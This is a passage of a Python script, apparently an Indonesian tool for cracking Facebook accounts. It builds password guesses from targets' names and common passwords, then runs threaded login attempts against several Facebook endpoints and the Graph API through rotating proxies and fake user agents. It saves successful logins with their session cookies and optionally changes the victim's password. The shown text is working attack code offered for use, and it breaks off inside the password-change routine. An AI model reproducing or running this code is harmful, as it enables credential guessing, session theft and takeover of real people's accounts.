	#print('Collecting  %s ID'%(str(len(ID))),end==' '); sys.stdout.flush()
	#Console(width=100).print(Panel(dp,title='Collecting',style='bold blue'))
    Console(width=100).print(Panel(f'[bold green][[bold white]*[bold green]] [bold white]Total ID Collected : {len(ID)}',style='bold blue'))
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack From ID Old
[bold green][[bold white]2[bold green]]. [bold white]Crack From ID New
[bold green][[bold white]3[bold green]]. [bold white]Crack From ID Random''') ; Console(width=100).print(Panel(exec ,style='bold blue'))
    zprint('╭──▸ [bold white]Random Recommended')
    idndi = console.input('╰──▸ [bold white]Choose : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
         for i in ID:
             ID2.insert(0,i)
    else:
         for i in ID:
             xx = random.randint(0, len(ID2))
             ID2.insert(xx, i)
    AturLogin()

def AturLogin():
    metod = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack From Methode Async
[bold green][[bold white]2[bold green]]. [bold white]Crack From Methode Reguler
[bold green][[bold white]3[bold green]]. [bold white]Crack From Methode Validate Password
[bold green][[bold white]4[bold green]]. [bold white]Crack From Methode Graph Facebook '''); Console(width=100).print(Panel(metod,style='bold blue'))
    zprint('╭──▸ [bold white]Crack From Email Not Recommended Using Validate Methode !!!')
    z = console.input('╰──▸ [bold white]Choose : ')
    if z in ['1','01']:tod.append('reguler')
    elif z in ['2','02']:tod.append('reguler2')
    elif z in ['3','03']:tod.append('validate')
    elif z in ['4','04']:tod.append('bApi')
    else:tod.append('validate')

    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack From free Facebook [bold green]  Recommended 1
[bold green][[bold white]2[bold green]]. [bold white]Crack From mbasic Facebook [bold green]Recommended 3
[bold green][[bold white]3[bold green]]. [bold white]Crack From Mobile Facebook [bold green]Recommended 2''') ; Console(width=100).print(Panel(exec ,style='bold blue'))
    zprint('╭──▸ [bold white]Choose Methode Login [bold green]URL LOGIN[bold white]')
    link = console.input('╰──▸ [bold white]Choose : ')
    if link in ['1','01']:url='free.facebook.com'
    elif link in ['2','02']:url='mbasic.facebook.com'
    else:url='m.facebook.com'

    pwh = ('[bold green][[bold white]?[bold green]] [bold white]Want Change Password Account OK?') ; Console(width=100).print(Panel(pwh,style='bold blue'))
    zprint('╭──▸ [bold white] Choose Y/N ')
    ubah = console.input('╰──▸ [bold white] Change Password : ')
    if ubah in ['y','Y','iya','yes']:
          UbahPw.append('ya')
          add_Password = console.input('╰──▸ [bold white]Input New Password : [bold green]')
          if len(add_Password) <=5:
               exit('\n [×] Password harus lebih dari 6 karaktaer contoh : sayang')
          else:
               open('password_baru_kamu.txt','w').write(add_Password)
    else:UbahPw.append('no')
    WordlistLogin().password(url)

class WordlistLogin:
    def __init__(self):
        pass

    def password(self,link):
        exec = (f'[bold green][[bold white]•[bold green]]. [bold white]OK Save in : OK/{indo}.txt\n[bold green][[bold white]•[bold green]]. [bold white]CP Save in : CP/{indo}.txt') ; Console(width=100).print(Panel(exec ,style='bold blue'))
        with __feri__(max_workers=30) as coid:
             for UserAkun in ID2:
                  uid,nama = UserAkun.split('/')
                  terserah = nama.split(' ')[0]
                  if len(nama) <=5:
                        if len(terserah) <=1 or len(terserah) <=2:pass
                        else:
                               pwx = [terserah+'123', terserah+'1234', terserah+'12345',terserah+'321','sayang','kata sandi','bismillah','qwerty','anjing','indonesia','rahasia','anggun','jakarta','123456','654321','kontol','qwerty123','katasandi','kucingku','majenang','surabaya','cilacap','rahasia','komputer','jancok','sakura','bianca','kontol','iloveyou','ganteng','cantik',nama.lower()] #'surabaya','password','123123','bintang','muhammad','doraemon','terserah','sukses','bajingan','matahari','maho123','sayangkamu','juventus','111111','mamapapa',nama.lower()]
                  else:
                        pwx = [nama, terserah+'123', terserah+'1234', terserah+'12345', terserah+'321','sayang','kata sandi',nama.lower()]

                  if 'reguler' in tod:coid.submit(self.crackxv, uid, pwx, link)
                  elif 'reguler2' in tod:coid.submit(self.crackxv3, uid, pwx, link)
                  elif 'validate' in tod:coid.submit(self.Validate3, uid, pwx, link)
                  elif 'bApi' in tod:coid.submit(self.b_api, uid, pwx, link)
                  else:coid.submit(self.Validate, uid, pwx, link)

        exit(f'\n\n [✓] Cracking Finished OK:{len(OK)} CP:{len(CP)}')

    def UserAgent(self):
        z = random.randint(3000,4000)
        i = random.randint(50,70)
        x = random.randint(80,120)
        u = float(random.randint(1,12))
        a = random.randint(6,12)
        y = random.choice(['5A','6A','8A','4A','10','11','4','5'])
        return (f'Mozilla/5.0 (Linux; Android {random.randint(4,12)}; Redmi {y} Build/MMB{random.randint(0,30)}M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{float(random.randint(1,12))} Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36')
    def crackxv3(self, user, pwx, url):
        global loop, OK,CP
        print(f'\r \033[97mReguler {ran}{user}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          agen = userr #self.UserAgent()
                          pro = random.choice(prox)
                          proxy = {'http': 'socks5://'+pro}
                          #ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
                          link = ses.get(f'https://{url}/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
                          date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
                          head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": agen, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
                          bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               if 'ya' in UbahPw:
                                     print('\r %s[ OK ] %s|%s|%s			  '%(H,uuid,pw,kueh))
                                     self.UbahPassword(uuid,pw,kueh,url)

                               else:
                                     print('\r %s[ OK ] %s|%s|%s		'%(H,uuid,pw,kueh))
                               open('OK/{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               os.popen('play-audio Data2/.ok.ogg')
                               OK.append('DOSA')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               print('\r %s[ CP ] %s|%s|%s                   \x1b[1;91m'%(K,uuid,pw,agen))
                               open('CP/{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               os.popen('play-audio Data2/.cp.ogg')
                               CP.append('TAI')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(10)
        loop +=1
    def b_api(self, user, pwx, url):
        global loop, OK, CP
        warna = random.choice([M,K,H,U,O,B])
       # times = str(datetime.now()-start).split('.')[0]
        print(f'\r 🔥 {warna}{user} {P}{loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' ');sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          headers = {
                                'Host':'graph.facebook.com',
                                'x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)),
                                'x-fb-sim-hni': repr(random.randint(2e4, 4e4)),
                                'x-fb-net-hni': repr(random.randint(2e4, 4e4)),
                                'x-fb-connection-quality': 'EXCELLENT',
                                'user-agent': userr,
                                'content-type': 'application/x-www-form-urlencoded',
                                'x-fb-http-engine': 'Liger'
                          }
                          data_req = {
                                'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
                                'format': random.choice(['JSON','json']),
                                'sdk_version': random.randrange(2, 10),
                                'email': user,
                                'locale': random.choice(['en_US','id_ID']),
                                'password': pw,
                                'sdk': 'android',
                                'generate_session_cookies': '1',
                                'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'
                          }
                          cookies = {
                                'cookie': open('data/cokie.txt','r').read()
                          }
                          session = ses.post("https://graph.facebook.com/v15.0/auth/login", params=data_req, headers=headers, cookies=cookies, allow_redirects=True).json()
                          if "session_key" in session:
                               cookie = ";".join(w["name"]+"="+w["value"] for w in session["session_cookies"])
                               print(f'\r {H}[ OK ] {user}|{pw}|{cookie}')
                               os.popen('play-audio Data2/.ok.ogg')
                               OK.append("WHEHHEEE")
                               save = f'{user}|{pw}|{cookie}'
                               with open(f"OK/{indo}.txt", "a", encoding="utf-8") as X:
                                    X.write(save+"\n")
                               break

                          elif "www.facebook.com" in session["error"]["message"]:
                               CP.append("ANAK KONTOL")
                               print(f'\r {K}[ CP ] {user}|{pw}                  ')
                               os.popen('play-audio Data2/.cp.ogg')
                               save = f'{user}|{pw}'
                               with open(f"CP/{indo}.txt", "a", encoding="utf-8") as X:
                                    X.write(save+"\n")
                               break
                          else:continue
             except requests.exceptions.ConnectionError: time.sleep(35)
        loop +=1
    def crackxv(self, user, pwx, url):
        global loop, OK,CP
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          respon_url = ses.get(f"https://{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&rtime=1672549227&subno_key=AaGZluEHGQYVl3gCNSeHWKp28l-eU3ils22C1oP1ah_o_u1BE7s4pc7QFETdcj360TffGwqNfRb3oEcRutyeQJQ6Ea69_bqtRoWco1Zet6y3XqDr2HD5PPLU3xnBN4i4U0SEmwmEdzZfoc9g-Mgzs1L9JXbYBOIr_S98YbeBdxmjN-0fDCZtxzXk0AAh4b033yMnPlIhtozA1uFPDW1Kd-Wj3DK54KD43tcY56OqSSWg8dOPsrhkneJTaBK1FT26cxKIsdFeI4CeP9YJNsfXMGrkYU6lAacbVHW2fnuFdLVUmw&hrc=1&refsrc=deprecated&_rdr h2").text
                          # = 'https://m.facebook.com'
                          bekas = ses.get(f"https://{url}/login/?email={user}&pass={pw}&locale2=id_ID")
                          data = {
                              'lsd':re.search('name="lsd" value="(.*?)"', respon_url).group(1),
                              'jazoest':re.search('name="jazoest" value="(.*?)"', respon_url).group(1),
                              'm_ts':re.search('name="m_ts" value="(.*?)"', respon_url).group(1),
                              'li':re.search('name="li" value="(.*?)"', respon_url).group(1),
                              'try_number':'0',
                              'unrecognized_tries':'0',
                              'email':user,
                              'pass':pw,
                              'login':'Masuk',
                              'bi_xrwh':'0'
                              #'login': 'Masuk',
                              #'sign_up': 'Buat Akun Baru',
                              #'bi_xrwh': '0',
                              #'_fb_noscript': 'true',
                              #'bi_xrwh':'
                          }
                          koki = {
                          	'datr': 'uZutYyH6GRlHj8n3ULdQVRDV',
                          	'sb': 'uZutY9sc4Q1f2ZOIeo3lA8VW'
                          }
#                          kuki = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                          head = {
                              'Host': url,
                              'content-length': '165',
                              'cache-control': 'max-age=0',
                              'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                              'sec-ch-ua-mobile': '?1',
                              'sec-ch-ua-platform': '"Android"',
                              'upgrade-insecure-requests': '1',
                              'origin': url,
                              'content-type': 'application/x-www-form-urlencoded',
                              'user-agent': self.UserAgent(),
                              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                              'sec-fetch-site': 'same-origin',
                              'sec-fetch-mode': 'navigate',
                              'sec-fetch-user': '?1',
                              'sec-fetch-dest': 'document',
                              'referer': f'https://{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                              'accept-encoding': 'gzip, deflate, br',
                              'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
                          }
                          next = 'https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
                          i = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl h2', headers=head, data=data, allow_redirects=False)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  {P}[ {H}OK {P}] {H}%s|%s|%s             '%(H,uuid,pw,kueh))
                               if 'ya' in UbahPw:
                                     self.UbahPassword(uuid,pw,kueh,url)
#                               if 'ya' in aplikasi:
#                                     self.cek_apk(kueh)
                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               os.popen('play-audio Data2/.ok.ogg')
                               OK.append('TAI')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               if 'ya' in Opsine:
                                     print('\r %s*  [ CP ] %s|%s             '%(K,uuid,pw))
                                     CekOptionAcount(uuid,pw)
                               else:
                                     print('\r %s*  [ CP ] %s|%s             '%(K,uuid,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               os.popen('play-audio Data2/.cp.ogg')
                               CP.append('TAI')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(10)
        loop +=1
        print(f'\r{P}new {ran}{user}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}      ', end=' ');sys.stdout.flush()
      
    def Validate2(self, user, pwx, url):
        global loop, OK, CP
        print(f'\r \033[97mValidate 2 {ran}{user}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        pro = random.choice(prox)
        proxs= {'http': 'socks5://'+pro}
        for pw in pwx:
             try:
                     with requests.Session() as x:
                          #agen = self.UserAgent() #'Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",'
                          agen = userr #random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/534.24 XiaoMi/MiuiBrowser/13.16.1-gn','Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'])
                          link = x.get('https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'uid':user,'next':'https://developers.facebook.com/webmaster/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(0000000000, 9999999999),pw)}
                          head = {'Host': url,'content-length': '319','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          posh = x.post('https://{}/login/device-based/validate-password/?shbl=0'.format(url),data=data, headers=head, allow_redirects=False,proxies=proxs)
                          if 'c_user' in x.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in x.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               if 'ya' in UbahPw:
                                     print('\r %s[ OK ] %s|%s|%s             '%(H,uuid,pw,kueh))
                                     self.UbahPassword(uuid,pw,kueh,url)
                               else:
                                     print('\r %s[ OK ] %s|%s|%s             '%(H,uuid,pw,kueh))
                               open('OK/{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               os.popen('play-audio Data2/.ok.ogg')
                               OK.append('DOSA LU BANG MALING')
                               break

                          elif 'checkpoint' in x.cookies.get_dict():
                               print('\r %s[ CP ] %s|%s|%s                   \x1b[1;91m'%(K,user,pw,agen))
                               open('CP/{}.txt'.format(indo),'a').write('%s|%s\n'%(user,pw))
                               os.popen('play-audio Data2/.cp.ogg')
                               CP.append('TAI KUNING')
                               break
                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(10)
        loop +=1
    def crackxv2(self, user, pwx, url):
        global loop, OK,CP
        print(f'\r \033[97mR2 {ran}{user}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          agen = self.UserAgent() #self.UserAgent()
                          link = ses.get('https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', link).group(1),'li':re.search('name="li" value="(.*?)"', link).group(1),'try_number':'0','unrecognized_tries':'0','email':user,'pass':pw,'login':'Masuk','bi_xrwh':'0'}
                          head = {'Host': url,'content-length': '128','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': userr,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr'.format(url),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          zzzz = ses.post('https://{}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100'.format(url), data=data, headers=head, allow_redirects=False)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               if 'ya' in UbahPw:
                                     print('\r %s[ OK ] %s|%s|%s			  '%(H,uuid,pw,kueh))
                                     self.UbahPassword(uuid,pw,kueh,url)

                               else:
                                     print('\r %s[ OK ] %s|%s|%s		'%(H,uuid,pw,kueh))
                               open('OK/{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               os.popen('play-audio Data2/.ok.ogg')
                               OK.append('DOSA')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               print('\r %s[ CP ] %s|%s|%s                   \x1b[1;91m'%(K,uuid,pw,agen))
                               open('CP/{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               os.popen('play-audio Data2/.cp.ogg')
                               CP.append('TAI')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(10)
        loop +=1

    def Validate3(self, user, pwx, url):
        global loop, OK, CP
        print(f'\r \033[97mValidate 1 {ran}{user}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)} ', end=' '); sys.stdout.flush()
        #print(f"\rV {P}[{B}{loop}{P}/{U}{len(ID2)}{P}]—{P}[{H}{OK}{P}]—{P}[{K}{CP}{x}]—[{ran}{'{:.0%}'.format(loop/float(len(ID2)))}{P}]  ")
        for pw in pwx:
             try:
                     with requests.Session() as x:
                          agen = 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36' #self.UserAgent() #'Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00RD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",'
                          #agen = userr #random.choice(['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/534.24 XiaoMi/MiuiBrowser/13.16.1-gn','Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'])
                          link = x.get('https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'uid':user,'next':'https://developers.facebook.com/webmaster/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(0000000000, 9999999999),pw)}
                          #bekasdata = {'lsd': 'AVrPU1dmxaU', 'jazoest': '2990', 'm_ts': '1672417101', 'li': 'TQ-vYwruFhkCSvleIYCl6AHJ', 'try_number': '0', 'unrecognized_tries': '0', 'login': 'Masuk', 'sign_up': 'Buat Akun Baru', 'bi_xrwh': '0', '_fb_noscript': 'true'}
                          head = {'Host': url,'content-length': '319','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          #bekashead = {'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'x-fb-rlafr': '0', 'x-zero-eh': 'ecea34e0a0b76b40e91edbffadaffa16', 'x-zero-rml': '0', 'document-policy': 'force-load-at-top', 'cross-origin-opener-policy': 'same-origin-allow-popups', 'Pragma': 'no-cache', 'Cache-Control': 'private, no-cache, no-store, must-revalidate', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'X-Frame-Options': 'DENY', 'Content-Type': 'text/html; charset=utf-8', 'Strict-Transport-Security': 'max-age=15552000; preload', 'Alt-Svc': 'h3=":443"; ma=86400', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive'}
                          posh = x.post('https://{}/login/device-based/validate-password/?shbl=0'.format(url),data=data, headers=head, allow_redirects=False)
                          if 'c_user' in x.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in x.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               if 'ya' in UbahPw:
                                     print('\r %s[ OK ] %s|%s|%s             '%(H,uuid,pw,kueh))
                                     self.UbahPassword(uuid,pw,kueh,url)
                               else:
                                     print('\r %s[ OK ] %s|%s|%s             '%(H,user,pw,kueh))
                               open('OK/{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               os.popen('play-audio Data2/.ok.ogg')
                               OK.append('DOSA LU BANG MALING')
                               break

                          elif 'checkpoint' in x.cookies.get_dict():
                               print('\r %s[ CP ] %s|%s|%s                   \x1b[1;91m'%(K,user,pw,agen))
                               open('CP/{}.txt'.format(indo),'a').write('%s|%s\n'%(user,pw))
                               os.popen('play-audio Data2/.cp.ogg')
                               CP.append('TAI KUNING')
                               break
                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(10)
        loop +=1

    def UbahPassword(self, user, password_old, coki, url):
        try:password_new = open('password_baru_kamu.txt','r').read()
        except:password_new = password_old
        with requests.Session() as ses:
             try:
                     link = ses.get(f'https://{url}/settings/security/password/',cookies={'cookie':coki})
                     data = {
                         'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"', link.text).group(1),
                         'jazoest':re.search('name="jazoest" value="(.*?)"', link.text).group(1),
                         'password_change_session_identifier':re.search('name="password_change_session_identifier" value="(.*?)"', link.text).group(1),
                         'password_old':password_old,
                         'password_new':password_new,
